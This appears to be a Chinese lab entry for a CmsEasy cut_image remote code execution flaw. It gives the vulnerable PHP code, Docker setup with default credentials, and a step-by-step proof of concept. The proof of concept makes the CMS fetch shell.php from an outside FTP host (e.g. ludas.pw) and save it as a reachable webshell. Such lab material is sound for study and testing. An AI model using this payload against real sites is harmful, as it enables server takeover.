CmsEasy < 5.6_20161012 cut_image 代码执行漏洞
---

### 漏洞信息
CmsEasy是一款基于PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。攻击者可以在网站前台进行Getshell。

详细参考：[CmsEasy前台无限制GetShell](https://xianzhi.aliyun.com/forum/read/215.html)
#####漏洞相关代码

```
/*function cut_image_action() {
    $len = 1;
    if(config::get('base_url') != '/'){
        $len = strlen(config::get('base_url'))+1;
    }
    if(substr($_POST['pic'],0,4) == 'http'){
        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);
    }else{
        front::$post['thumb'] = substr($_POST['pic'],$len);
    }
    $thumb=new thumb();
    $thumb->set(front::$post['thumb'],'jpg');
    $img=$thumb->create_image($thumb->im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));
    $save_file='upload/images/'.date('Ym').'/'.$new_name;
    @mkdir(dirname(ROOT.'/'.$save_file));
    ob_start();
    $thumb->out_image($img,null,85);
    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());
    ob_end_clean();
    $image_url=config::get('base_url').'/'.$save_file;
    //$res['size']=ceil(strlen($img) / 1024);
    $res['code']="
                    //$('#cut_preview').attr('src','$image_url');
                    $('#thumb').val('$image_url');
                    alert(lang('save_success'));
    ";
    echo json::encode($res);
}
*/
```

### 镜像信息
类型 | 用户名 | 密码
:-:|:-:|:-:
Mysql | root | root
/admin/ | admin | admin888

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:c_cmseay_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:c_cmseay_1
```
  > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用
访问 `http://你的 IP 地址:端口号/`

### PoC 使用

1.特殊图片处理

>解压payload.zip，使用shell.jpg或者jpg_payload自行生成可以过gd处理的图片
>使用方法 php jpg_payload.php new.jpg 会在运行目录下生成payload_new.jpg

2.部署远程环境
>将shell.jpg上传至FTP服务器并将后缀改为php

3.获取webshell

>`http://你的 IP 地址:端口号`/index.php?case=tool&act=cut_image
post data:
pic=1ftp://`FTP地址`/shell.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120

```
相关参数说明
w=x2=图片宽度
h=y2=图片高度
x1=y1=固定0

如果$_POST['pic']开头4个字符不是http的话，就认为是本站的文件，会从前面抽取掉baseurl（等于返回文件相对路径）所以构造的时候 如果站点不是放在根目录 则需要在前面补位strlen(base_url)+2 如果放在根目录 也需要补上1位（'/'的长度）
```


>举个栗子：

>目标站 `http://www.target.com/easy/cmseasy`放在easy子目录,就需要补上strlen(base_url)+2 = strlen('easy')+2=6位post数据就是
>`pic=111111ftp://ludas.pw/shell.php&w=228&h=146&x1=0&x2=228&y1=0&y2=146`

>目标站` http://www.target2.com/cmseasy`放在web根目录 就需要补上1位post数据就是
>pic=`1ftp://ludas.pw/shell.php`&w=228&h=146&x1=0&x2=228&y1=0&y2=146


成功会返回
>{"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}

拼接URL构造shell地址
>`http://你的 IP 地址:端口号`/upload/images/201612/148159258747.php

